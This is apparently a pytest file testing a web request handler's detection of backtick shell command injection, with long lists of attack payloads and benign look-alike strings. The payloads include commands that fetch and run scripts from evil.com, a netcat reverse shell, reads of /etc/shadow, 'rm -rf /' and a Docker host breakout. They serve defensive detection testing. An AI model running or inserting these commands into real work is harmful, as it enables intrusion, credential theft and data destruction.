import pytest

from guard_core.handlers.suspatterns_handler import (
    _LOG4SHELL_JNDI_LOOKUP_RE,
    sus_patterns_handler,
)

BARE_BACKTICK_COMMAND_SUBSTITUTION_PAYLOADS = [
    pytest.param("`whoami`", id="bare_whoami"),
    pytest.param("`id`", id="bare_id"),
    pytest.param("`reboot`", id="bare_reboot"),
    pytest.param("`shutdown -h now`", id="bare_shutdown_flag"),
    pytest.param("`docker run --rm -it alpine sh`", id="bare_docker_run"),
    pytest.param("`docker exec -it victim sh`", id="bare_docker_exec"),
    pytest.param(
        "`docker run -v /:/host --rm alpine chroot /host sh`",
        id="bare_docker_host_breakout",
    ),
    pytest.param("`kubectl get secrets`", id="bare_kubectl_get_secrets"),
    pytest.param("`kubectl exec -it pod -- sh`", id="bare_kubectl_exec"),
    pytest.param("`openssl rand -hex 16`", id="bare_openssl_rand"),
    pytest.param("`openssl x509 -in /etc/ssl/key.pem`", id="bare_openssl_x509"),
    pytest.param('`eval "id"`', id="bare_eval_quoted_id"),
    pytest.param("`eval whoami`", id="bare_eval_whoami"),
    pytest.param("`exec /bin/sh`", id="bare_exec_bin_sh"),
    pytest.param("`exec whoami`", id="bare_exec_whoami"),
    pytest.param("`systemctl restart sshd`", id="bare_systemctl_restart"),
    pytest.param("`systemctl stop firewalld`", id="bare_systemctl_stop"),
    pytest.param("`curl http://evil.com/x.sh | sh`", id="bare_curl_pipe_sh"),
    pytest.param(
        "`curl -fsSL https://evil.sh | bash -`", id="bare_curl_fssl_pipe_bash"
    ),
    pytest.param("`wget -qO- http://evil.com/x | sh`", id="bare_wget_pipe_sh"),
    pytest.param("`curl -s http://evil.com/x.sh|sh`", id="bare_curl_pipe_sh_nospace"),
    pytest.param("; `whoami`", id="separator_semicolon_whoami"),
    pytest.param("| `id`", id="separator_pipe_id"),
    pytest.param("& `reboot`", id="separator_ampersand_reboot"),
    pytest.param(";`whoami`", id="separator_semicolon_whoami_nospace"),
    pytest.param("|`id`", id="separator_pipe_id_nospace"),
    pytest.param("&`reboot`", id="separator_ampersand_reboot_nospace"),
    pytest.param("&& `whoami`", id="separator_double_ampersand_whoami"),
    pytest.param("|| `id`", id="separator_double_pipe_id"),
    pytest.param("; `whoami`;", id="separator_wrapped_whoami"),
    pytest.param("`id`; `whoami`", id="chained_semicolon_id_whoami"),
    pytest.param("`id`|`whoami`", id="chained_pipe_id_whoami"),
    pytest.param("`id`&`whoami`", id="chained_ampersand_id_whoami"),
    pytest.param("`uname -a`", id="bare_uname_a"),
    pytest.param("`hostname`", id="bare_hostname"),
    pytest.param("`ifconfig`", id="bare_ifconfig"),
    pytest.param("`ipconfig /all`", id="bare_ipconfig_all"),
    pytest.param("`pwd`", id="bare_pwd"),
    pytest.param("`groups`", id="bare_groups"),
    pytest.param("`cat /etc/passwd`", id="bare_cat_etc_passwd"),
    pytest.param("`cat /etc/shadow`", id="bare_cat_etc_shadow"),
    pytest.param("`ls -la /`", id="bare_ls_la_root"),
    pytest.param("`nc -e /bin/sh 10.0.0.1 4444`", id="bare_nc_reverse_shell"),
    pytest.param("`ping -c 1 attacker.example`", id="bare_ping_exfil"),
    pytest.param("`python3 exploit.py`", id="bare_python3_exploit"),
    pytest.param(
        "`python3 -c 'import os;os.system(\"id\")'`", id="bare_python3_inline_exec"
    ),
    pytest.param("`perl -e 'system(\"id\")'`", id="bare_perl_inline_exec"),
    pytest.param("`ruby -e 'system(\"id\")'`", id="bare_ruby_inline_exec"),
    pytest.param(
        '`node -e \'require("child_process").exec("id")\'`',
        id="bare_node_inline_exec",
    ),
    pytest.param("`bash -c id`", id="bare_bash_c_id"),
    pytest.param("`sh -c id`", id="bare_sh_c_id"),
    pytest.param("`/bin/sh -c id`", id="bare_path_sh_c_id"),
    pytest.param("`./malicious.sh`", id="bare_relative_path_script"),
    pytest.param("`~/backdoor.sh`", id="bare_home_relative_script"),
    pytest.param("`/usr/bin/whoami`", id="bare_absolute_path_whoami"),
    pytest.param("`/bin/id`", id="bare_absolute_path_id"),
    pytest.param("`$(whoami)`", id="bare_nested_dollar_paren_whoami"),
    pytest.param("`$(id)`", id="bare_nested_dollar_paren_id"),
    pytest.param("`echo $(whoami)`", id="bare_echo_nested_dollar_paren"),
    pytest.param("`w\\ho\\ami`", id="obfuscated_backslash_split_whoami"),
    pytest.param('`who"am"i`', id="obfuscated_double_quote_split"),
    pytest.param("`wh'o'ami`", id="obfuscated_single_quote_split"),
    pytest.param("`echo \\`id\\``", id="obfuscated_escaped_nested_backtick"),
    pytest.param("`base64 -d <<< payload | sh`", id="bare_base64_heredoc_pipe_sh"),
    pytest.param(
        "`echo d2hvYW1p | base64 -d | sh`", id="obfuscated_base64_decode_pipe_sh"
    ),
    pytest.param(
        "`curl -s http://evil.com/x.sh > /tmp/x.sh; sh /tmp/x.sh`",
        id="bare_curl_download_then_exec",
    ),
    pytest.param("  `whoami`  ", id="bare_whoami_padded_whitespace"),
    pytest.param("`rm -rf /tmp/*`", id="bare_rm_rf_glob"),
    pytest.param("`chmod 777 /etc/passwd`", id="bare_chmod_777_passwd"),
    pytest.param("`mkfifo /tmp/f`", id="bare_mkfifo"),
    pytest.param("`env`", id="bare_env"),
    pytest.param("`printenv`", id="bare_printenv"),
    pytest.param("`ps aux`", id="bare_ps_aux"),
    pytest.param("`netstat -an`", id="bare_netstat_an"),
    pytest.param("`crontab -l`", id="bare_crontab_l"),
    pytest.param("`history`", id="bare_history"),
    pytest.param("`sudo -l`", id="bare_sudo_l"),
    pytest.param("`aws sts get-caller-identity`", id="bare_aws_sts"),
    pytest.param("`az account show`", id="bare_az_account_show"),
    pytest.param("`gcloud auth list`", id="bare_gcloud_auth_list"),
    pytest.param("`X=1 whoami`", id="obfuscated_env_var_prefix_whoami"),
]

BENIGN_STRINGS_NOT_FLAGGED = [
    pytest.param("Run `ls` to list files in the directory.", id="markdown_ls_mention"),
    pytest.param("The `cat` command concatenates files.", id="markdown_cat_mention"),
    pytest.param(
        "Try `curl -X GET` against the users endpoint.", id="markdown_curl_snippet"
    ),
    pytest.param("`whoami` prints the current user.", id="markdown_whoami_mention"),
    pytest.param(
        "I recommend running `id` first to check your uid.", id="markdown_id_mention"
    ),
    pytest.param(
        "Our `python` style guide is in the wiki.", id="markdown_python_mention"
    ),
    pytest.param("See `bash --version` for compatibility.", id="markdown_bash_flag"),
    pytest.param("`sh` scripts belong in /bin.", id="markdown_sh_sentence_initial"),
    pytest.param(
        "Documentation: use `wget` to download release artifacts.",
        id="markdown_wget_docs",
    ),
    pytest.param(
        'Support ticket: "After I run `rm` on the wrong folder..."',
        id="support_ticket_rm_prose",
    ),
    pytest.param(
        "The `echo` builtin writes its arguments to standard output.",
        id="prose_echo_explainer",
    ),
    pytest.param(
        "Use `printf '%s\\n' \"$var\"` instead of echo for portability.",
        id="prose_printf_example",
    ),
    pytest.param(
        "`chmod +x script.sh` makes the script executable.", id="markdown_chmod_mention"
    ),
    pytest.param("`mv old.txt new.txt` renames a file.", id="markdown_mv_mention"),
    pytest.param(
        "`cp -r src/ dst/` copies a directory recursively.", id="markdown_cp_mention"
    ),
    pytest.param(
        "The process was stopped with `kill -TERM`.", id="prose_kill_signal_mention"
    ),
    pytest.param(
        "`ping` the host to check connectivity before debugging further.",
        id="prose_ping_mention",
    ),
    pytest.param(
        "`dig example.com` returns the DNS records for a domain.",
        id="markdown_dig_mention",
    ),
    pytest.param(
        "We no longer support `telnet` in this environment.", id="prose_telnet_mention"
    ),
    pytest.param(
        "Encode the payload with `base64` before sending it over email.",
        id="prose_base64_mention",
    ),
    pytest.param(
        "`awk` and `sed` are classic Unix text-processing tools.",
        id="markdown_awk_sed_mention",
    ),
    pytest.param(
        "`find . -name '*.py'` lists every Python file in the tree.",
        id="markdown_find_mention",
    ),
    pytest.param(
        "`tar -xzf archive.tar.gz` extracts a gzip-compressed tarball.",
        id="markdown_tar_mention",
    ),
    pytest.param(
        "Check your `env` for the missing `PATH` entry.", id="prose_env_mention"
    ),
    pytest.param(
        "We're migrating our ops scripts from `powershell` to `bash`.",
        id="prose_powershell_mention",
    ),
    pytest.param(
        "`node --version` should print v18 or later.", id="markdown_node_mention"
    ),
    pytest.param(
        "This endpoint is implemented in `php`, not `ruby`.",
        id="prose_php_ruby_mention",
    ),
    pytest.param(
        "`nslookup` is the classic DNS lookup tool, `dig` is its modern replacement.",
        id="prose_nslookup_dig_mention",
    ),
    pytest.param(
        "The total is due: $(the total is due)", id="dollar_paren_non_command_word"
    ),
    pytest.param(
        "Set the amount with ${amount} in the template.", id="template_syntax_amount"
    ),
    pytest.param(
        "Use ${user.name} to interpolate the current user's name.",
        id="template_syntax_user_name",
    ),
    pytest.param(
        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
        id="makefile_variable_references",
    ),
    pytest.param(
        "In your shell profile, $(VAR)-style expansion is POSIX and ${VAR} is the "
        "modern equivalent.",
        id="shell_docs_var_expansion",
    ),
    pytest.param(
        '```json\n{"message": "Run `ls -la` first", "code": "`id`"}\n```',
        id="json_fenced_with_backticks",
    ),
    pytest.param(
        '{"tip": "use `curl` to fetch the resource", "example": "`wget` the release '
        'archive"}',
        id="json_body_with_backticks",
    ),
    pytest.param(
        "LGTM, just rename `foo` to `bar` before merging.", id="code_review_rename"
    ),
    pytest.param(
        "nit: extract this into a `find`-and-replace across the module.",
        id="code_review_find_mention",
    ),
    pytest.param(
        "Can you `rm` the unused import in this diff?", id="code_review_rm_mention"
    ),
    pytest.param(
        "Please `mv` this helper into utils.py in your next commit.",
        id="code_review_mv_mention",
    ),
    pytest.param(
        "Consider using `cp` semantics here instead of moving the reference.",
        id="code_review_cp_mention",
    ),
    pytest.param(
        "The `env` command with no arguments lists every variable in scope.",
        id="shell_docs_env_explainer",
    ),
    pytest.param(
        "`kill -l` lists all available signal names.", id="shell_docs_kill_list"
    ),
    pytest.param(
        "A backtick pair like `sed` renders as inline code in Markdown.",
        id="markdown_meta_explainer",
    ),
    pytest.param(
        "Our CI step runs `tar` to package build artifacts before upload.",
        id="prose_ci_tar_mention",
    ),
    pytest.param(
        "`awk '{print $1}'` prints the first column of each line.",
        id="markdown_awk_field_example",
    ),
    pytest.param(
        "TODO: replace `getUserId()` with the new auth helper.",
        id="todo_replace_function",
    ),
    pytest.param(
        "TODO: swap $(id -u) for os.getuid() before merging.",
        id="todo_dollar_paren_mention",
    ),
    pytest.param(
        "fix: rename `parseInput()` to `parseRequest()`", id="commit_message_rename"
    ),
    pytest.param(
        "chore: bump `docker` base image to 3.12-slim", id="commit_message_docker_bump"
    ),
    pytest.param(
        "docs: clarify that `kubectl` requires a valid kubeconfig",
        id="commit_message_kubectl_docs",
    ),
    pytest.param(
        "The invoice total is `$1,204.50` due on receipt.", id="money_amount_invoice"
    ),
    pytest.param(
        "Price adjusted to `$99.99` after the discount.", id="money_amount_discount"
    ),
    pytest.param(
        "See the config file `settings.yml` for defaults.", id="filename_settings_yml"
    ),
    pytest.param(
        "Please review `README.md` before opening a PR.", id="filename_readme_prose"
    ),
    pytest.param(
        "The template uses `{{ user.name }}` for interpolation.",
        id="template_syntax_mustache",
    ),
    pytest.param(
        "Our Jinja template renders `{% if active %}` blocks conditionally.",
        id="template_syntax_jinja",
    ),
    pytest.param("`v2.1.0` is the current stable release tag.", id="version_tag_prose"),
    pytest.param("`main.py` is the entry point for the CLI.", id="filename_main_py"),
    pytest.param(
        "In bash, backticks like `command` are legacy syntax for command substitution.",
        id="shell_docs_backtick_explainer",
    ),
    pytest.param(
        "The manual explains that `` `cmd` `` and `$(cmd)` are equivalent in "
        "POSIX shells.",
        id="shell_docs_double_backtick_span",
    ),
    pytest.param(
        "A `.env` file typically defines `DATABASE_URL` and `SECRET_KEY`.",
        id="shell_docs_dotenv_vars",
    ),
    pytest.param(
        '`git commit -m "fix: handle null case"` records the change.',
        id="git_docs_commit_example",
    ),
    pytest.param(
        "Reviewer note: `whoami` here is just the variable name, not a call.",
        id="code_review_whoami_variable_name",
    ),
    pytest.param(
        "Class attribute `id` maps to the primary key column.",
        id="code_review_id_attribute",
    ),
    pytest.param(
        "The HTML `id` attribute must be unique per page.", id="docs_html_id_attribute"
    ),
    pytest.param(
        "Field `hostname` is required in the payload schema.",
        id="docs_hostname_field_schema",
    ),
    pytest.param(
        "`docker compose up -d` starts every service defined in `docker-compose.yml`.",
        id="shell_docs_docker_compose",
    ),
    pytest.param(
        "`kubectl apply -f deployment.yaml` rolls out the new manifest.",
        id="shell_docs_kubectl_apply",
    ),
    pytest.param(
        "Our runbook says `systemctl status nginx` to check the service state.",
        id="shell_docs_systemctl_status",
    ),
    pytest.param(
        "`openssl x509 -in cert.pem -noout -dates` shows certificate validity.",
        id="shell_docs_openssl_dates",
    ),
    pytest.param(
        "Use `curl -s https://example.com | jq .` to pretty-print JSON responses.",
        id="shell_docs_curl_jq_pipeline",
    ),
    pytest.param(
        "`eval` in Python is different from `eval` in Bash; be careful comparing them.",
        id="prose_eval_language_comparison",
    ),
    pytest.param(
        "`exec` in Python replaces the current process image, similar to shell `exec`.",
        id="prose_exec_language_comparison",
    ),
    pytest.param(
        "The onboarding doc says run `reboot` only after applying kernel patches.",
        id="shell_docs_reboot_after_patches",
    ),
    pytest.param(
        "&& is the logical AND operator in most C-like languages.",
        id="prose_double_ampersand_operator",
    ),
    pytest.param(
        "Use `a && b` to run `b` only if `a` succeeds.", id="markdown_and_operator"
    ),
    pytest.param(
        "The condition `x || y` short-circuits once `x` is truthy.",
        id="markdown_or_operator",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", BARE_BACKTICK_COMMAND_SUBSTITUTION_PAYLOADS)
async def test_bare_backtick_command_substitution_is_detected(payload: str) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


@pytest.mark.asyncio
async def test_bare_backtick_command_substitution_is_detected_via_query_param() -> None:
    result = await sus_patterns_handler.detect(
        content="`whoami`", ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True


@pytest.mark.asyncio
@pytest.mark.parametrize("text", BENIGN_STRINGS_NOT_FLAGGED)
async def test_benign_text_not_flagged_as_command_injection(text: str) -> None:
    result = await sus_patterns_handler.detect(
        content=text, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
async def test_benign_text_not_flagged_via_query_param_context() -> None:
    result = await sus_patterns_handler.detect(
        content="Run `ls` to list files in the directory.",
        ip_address="198.51.100.4",
        context="query_param",
    )
    assert result["is_threat"] is False


BACKTICK_WRAPPED_SUBSTITUTION_NOT_FLAGGED = [
    pytest.param("see the `$(id)` example", id="backtick_wrapped_dollar_paren_id"),
    pytest.param("run `$(whoami)` first", id="backtick_wrapped_dollar_paren_whoami"),
    pytest.param("use `${HOME}` in paths", id="backtick_wrapped_dollar_brace_home"),
    pytest.param(
        "the docs show `$(pwd)` as an example substitution",
        id="backtick_wrapped_dollar_paren_pwd",
    ),
    pytest.param(
        "reference `${PATH}` in your shell config",
        id="backtick_wrapped_dollar_brace_path",
    ),
]

SEPARATOR_PREFIXED_SUBSTITUTION_STILL_FLAGGED = [
    pytest.param("; $(id)", id="semicolon_dollar_paren_id"),
    pytest.param("| $(whoami)", id="pipe_dollar_paren_whoami"),
    pytest.param("& ${HOME}", id="ampersand_dollar_brace_home"),
    pytest.param(";$(cat /etc/passwd)", id="semicolon_dollar_paren_no_space"),
    pytest.param("|${IFS}cat${IFS}/etc/passwd", id="pipe_dollar_brace_ifs"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", BACKTICK_WRAPPED_SUBSTITUTION_NOT_FLAGGED)
async def test_backtick_wrapped_substitution_not_flagged(payload: str) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", SEPARATOR_PREFIXED_SUBSTITUTION_STILL_FLAGGED)
async def test_separator_prefixed_substitution_still_flagged(payload: str) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


SQL_BACKTICK_IDENTIFIER_STRINGS_NOT_FLAGGED = [
    pytest.param(
        "SELECT `id`, `name` FROM `users` WHERE `active` = 1",
        id="sql_select_backtick_columns",
    ),
    pytest.param(
        "INSERT INTO `orders` (`id`, `total`) VALUES (1, 9.99)",
        id="sql_insert_backtick_columns",
    ),
    pytest.param(
        "ALTER TABLE `users` ADD COLUMN `email` VARCHAR(255)",
        id="sql_alter_table_backtick",
    ),
    pytest.param(
        "SELECT `u`.`id` FROM `users` `u` JOIN `orders` `o` ON `u`.`id` = `o`.`uid`",
        id="sql_qualified_backtick_join",
    ),
    pytest.param(
        "CREATE TABLE `products` (`id` INT PRIMARY KEY, `sku` VARCHAR(64))",
        id="sql_create_table_backtick",
    ),
    pytest.param(
        "UPDATE `settings` SET `value` = 'dark' WHERE `key` = 'theme'",
        id="sql_update_backtick",
    ),
    pytest.param(
        "The column is named `created_at`, not `createdAt`.",
        id="sql_docs_column_naming",
    ),
    pytest.param(
        "In MySQL, wrap reserved words like `order` and `group` in backticks.",
        id="sql_docs_reserved_words",
    ),
    pytest.param(
        "DELETE FROM `sessions` WHERE `expires_at` < NOW()",
        id="sql_delete_backtick",
    ),
    pytest.param(
        "SELECT COUNT(*) FROM `audit_log` WHERE `action` = 'login'",
        id="sql_count_backtick",
    ),
    pytest.param(
        "Our schema uses `snake_case` for every `table_name`.",
        id="sql_docs_snake_case",
    ),
    pytest.param(
        "The migration renames `users`.`fullname` to `users`.`full_name`.",
        id="sql_docs_migration_rename",
    ),
    pytest.param(
        "EXPLAIN SELECT id FROM `inventory` WHERE `sku` = 'ABC123'",
        id="sql_explain_backtick",
    ),
    pytest.param(
        "GRANT SELECT ON `analytics`.* TO 'readonly'@'%'",
        id="sql_grant_backtick",
    ),
    pytest.param(
        "The index covers `(tenant_id, created_at)` on `events`.",
        id="sql_docs_index_mention",
    ),
]

JS_TEMPLATE_LITERAL_STRINGS_NOT_FLAGGED = [
    pytest.param(
        "const greeting = `Hello ${name}, you have ${count} items`;",
        id="js_template_literal_greeting",
    ),
    pytest.param(
        "const url = `https://api.example.com/users/${userId}`;",
        id="js_template_literal_url",
    ),
    pytest.param(
        "console.log(`Fetched ${data.length} rows in ${elapsed}ms`);",
        id="js_template_literal_console_log",
    ),
    pytest.param("return `Total: $${total}`;", id="js_template_literal_total"),
    pytest.param(
        "const query = `SELECT id FROM users WHERE id = ${id}`;",
        id="js_template_literal_sql_interpolation",
    ),
    pytest.param(
        "throw new Error(`Invalid input: ${input}`);",
        id="js_template_literal_error",
    ),
    pytest.param(
        "const path = `/api/v1/${resource}/${id}`;",
        id="js_template_literal_path",
    ),
    pytest.param(
        "const label = `${first} ${last}`.trim();",
        id="js_template_literal_label",
    ),
    pytest.param(
        "logger.info(`Request to ${req.path} took ${ms}ms`);",
        id="js_template_literal_logger",
    ),
    pytest.param(
        "const msg = `Welcome back, ${user.name}!`;",
        id="js_template_literal_welcome",
    ),
]

CHANGELOG_STRINGS_NOT_FLAGGED = [
    pytest.param(
        "Fixed `ls -la` output bug in the file browser.",
        id="changelog_fixed_ls_bug",
    ),
    pytest.param(
        "Added support for `curl`-style headers in the CLI.",
        id="changelog_added_curl_support",
    ),
    pytest.param(
        "Removed the deprecated `whoami` alias.", id="changelog_removed_whoami_alias"
    ),
    pytest.param(
        "Renamed `getUserId` to `resolveUserId` for clarity.",
        id="changelog_renamed_function",
    ),
    pytest.param(
        "Bumped `docker-compose` to v2.24.", id="changelog_bumped_docker_compose"
    ),
    pytest.param(
        "`npm run build` now runs three times faster.",
        id="changelog_npm_build_speed",
    ),
    pytest.param(
        "Patched a race condition in `id` allocation.",
        id="changelog_patched_id_race",
    ),
    pytest.param(
        "`eval` calls are now disallowed in the sandbox by default.",
        id="changelog_eval_disallowed",
    ),
    pytest.param(
        "Improved error messages for `exec` failures.",
        id="changelog_improved_exec_errors",
    ),
    pytest.param(
        "The `reboot` command now requires confirmation.",
        id="changelog_reboot_confirmation",
    ),
]

SENTENCE_BOUNDARY_BACKTICK_STRINGS_NOT_FLAGGED = [
    pytest.param("just try `id`", id="chat_message_ends_with_id_no_period"),
    pytest.param(
        "no period after this one `whoami`", id="chat_message_ends_with_whoami"
    ),
    pytest.param("the fix was to run `ls -la`", id="chat_message_ends_with_ls_la"),
    pytest.param("final answer: `pwd`", id="chat_message_ends_with_pwd"),
    pytest.param("the missing command is `env`", id="chat_message_ends_with_env"),
    pytest.param("closing thought, use `reboot`", id="chat_message_ends_with_reboot"),
    pytest.param("one more thing, check `uname -a`", id="chat_message_ends_with_uname"),
    pytest.param("last tip: `history`", id="chat_message_ends_with_history"),
    pytest.param("final step: `sudo -l`", id="chat_message_ends_with_sudo_l"),
    pytest.param("and that's it, just `id`", id="chat_message_trailing_id"),
    pytest.param(
        "`id` is the command everyone forgets", id="chat_message_starts_with_id"
    ),
    pytest.param(
        "`whoami` is your first debugging step", id="chat_message_starts_with_whoami"
    ),
    pytest.param("`ls` before you `rm` anything", id="chat_message_starts_with_ls"),
    pytest.param(
        "`env` shows what your shell inherited", id="chat_message_starts_with_env"
    ),
    pytest.param(
        "`pwd` tells you where you are right now", id="chat_message_starts_with_pwd"
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("text", SQL_BACKTICK_IDENTIFIER_STRINGS_NOT_FLAGGED)
async def test_sql_backtick_identifier_not_flagged_as_command_injection(
    text: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=text, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
@pytest.mark.parametrize("text", JS_TEMPLATE_LITERAL_STRINGS_NOT_FLAGGED)
async def test_js_template_literal_not_flagged_as_command_injection(
    text: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=text, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
@pytest.mark.parametrize("text", CHANGELOG_STRINGS_NOT_FLAGGED)
async def test_changelog_backtick_mention_not_flagged_as_command_injection(
    text: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=text, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
@pytest.mark.parametrize("text", SENTENCE_BOUNDARY_BACKTICK_STRINGS_NOT_FLAGGED)
async def test_sentence_boundary_backtick_mention_not_flagged_as_command_injection(
    text: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=text, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


GLUED_SHELL_COMMAND_BACKTICK_PAYLOADS = [
    pytest.param("abc`cat /etc/passwd`", id="glued_prefix_cat_passwd"),
    pytest.param("1;`id`x", id="glued_separator_prefix_and_suffix_id"),
    pytest.param("note`rm -rf /`note", id="glued_prefix_and_suffix_rm"),
]

GLUED_BARE_WORD_BACKTICK_PAYLOADS_AMBIGUOUS_BY_DESIGN = [
    pytest.param("a`whoami`", id="glued_prefix_single_char_whoami"),
    pytest.param("q`whoami`q", id="glued_prefix_and_suffix_whoami"),
    pytest.param("img`whoami`.png", id="glued_prefix_and_dotted_suffix_whoami"),
    pytest.param("search=test`whoami`", id="glued_query_value_prefix_whoami"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "payload", GLUED_BARE_WORD_BACKTICK_PAYLOADS_AMBIGUOUS_BY_DESIGN
)
async def test_glued_bare_word_backtick_payload_not_flagged_in_request_body(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "payload", GLUED_BARE_WORD_BACKTICK_PAYLOADS_AMBIGUOUS_BY_DESIGN
)
async def test_glued_bare_word_backtick_payload_detected_in_query_param(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", GLUED_SHELL_COMMAND_BACKTICK_PAYLOADS)
async def test_glued_shell_command_backtick_payload_is_detected_in_request_body(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", GLUED_SHELL_COMMAND_BACKTICK_PAYLOADS)
async def test_glued_shell_command_backtick_payload_is_detected_in_query_param(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


GLUED_AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS = [
    pytest.param("x`id`", id="glued_prefix_single_char_id"),
    pytest.param("1`id`", id="glued_prefix_digit_id"),
    pytest.param("search`id`", id="glued_prefix_word_id"),
    pytest.param("user`id`123", id="glued_prefix_and_suffix_id"),
    pytest.param("file`id`.txt", id="glued_prefix_and_dotted_suffix_id"),
    pytest.param("`id`x", id="glued_suffix_single_char_id"),
    pytest.param("`id`suffix", id="glued_suffix_word_suffix_id"),
    pytest.param("term`id`", id="glued_prefix_word_id_variant"),
    pytest.param("value`reboot`value", id="glued_prefix_and_suffix_reboot"),
    pytest.param("foo`id`", id="glued_prefix_foo_id"),
    pytest.param("`id`bar", id="glued_suffix_bar_id"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS)
async def test_glued_ambiguous_token_backtick_payload_is_detected_in_query_param(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS)
async def test_glued_ambiguous_token_backtick_payload_is_detected_in_url_path(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="url_path"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS_BENIGN_IN_REQUEST_BODY = [
    pytest.param("search`id`", id="glued_prefix_word_id"),
    pytest.param("`id`suffix", id="glued_suffix_word_suffix_id"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "payload", AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS_BENIGN_IN_REQUEST_BODY
)
async def test_glued_ambiguous_token_backtick_payload_not_flagged_in_request_body(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is False


KEBAB_IDENTIFIER_BACKTICK_PAYLOADS_BENIGN_IN_REQUEST_BODY = [
    pytest.param("header`x-forwarded-for`value", id="kebab_header_x_forwarded_for"),
    pytest.param("config`well-known`here", id="kebab_config_well_known"),
    pytest.param("ref`user`list", id="plausible_ref_user_list"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "payload", KEBAB_IDENTIFIER_BACKTICK_PAYLOADS_BENIGN_IN_REQUEST_BODY
)
async def test_glued_kebab_identifier_backtick_payload_not_flagged_in_request_body(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
async def test_glued_kebab_identifier_backtick_is_clean_in_query_param() -> None:
    result = await sus_patterns_handler.detect(
        content="header`x-forwarded-for`value",
        ip_address="203.0.113.9",
        context="query_param",
    )
    assert result["is_threat"] is False


PLAIN_PARAMETER_EXPANSION_CLEAN = [
    pytest.param("${whoami}", id="dollar_brace_bare_whoami"),
    pytest.param("${name}", id="dollar_brace_bare_name"),
    pytest.param("${count}", id="dollar_brace_bare_count"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", PLAIN_PARAMETER_EXPANSION_CLEAN)
@pytest.mark.parametrize("context", ["query_param", "url_path"])
async def test_plain_parameter_expansion_is_not_flagged(
    payload: str, context: str
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context=context
    )
    assert result["is_threat"] is False


PUNCTUATION_GLUED_QUERY_STRING_BACKTICK_NOT_FLAGGED = [
    pytest.param("name=`id`&x=1", id="query_string_equals_ampersand_glued_id"),
    pytest.param(
        "sort=`created_at`&order=asc", id="query_string_equals_ampersand_glued_sort"
    ),
    pytest.param("a=1&`b`=2", id="query_string_ampersand_equals_glued_b"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", PUNCTUATION_GLUED_QUERY_STRING_BACKTICK_NOT_FLAGGED)
async def test_punctuation_glued_query_string_backtick_not_flagged(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


GLUED_BACKTICK_NON_ASCII_TOKEN_NOT_FLAGGED = [
    pytest.param("x`café /etc/passwd`", id="glued_backtick_accented_word_and_path"),
    pytest.param(
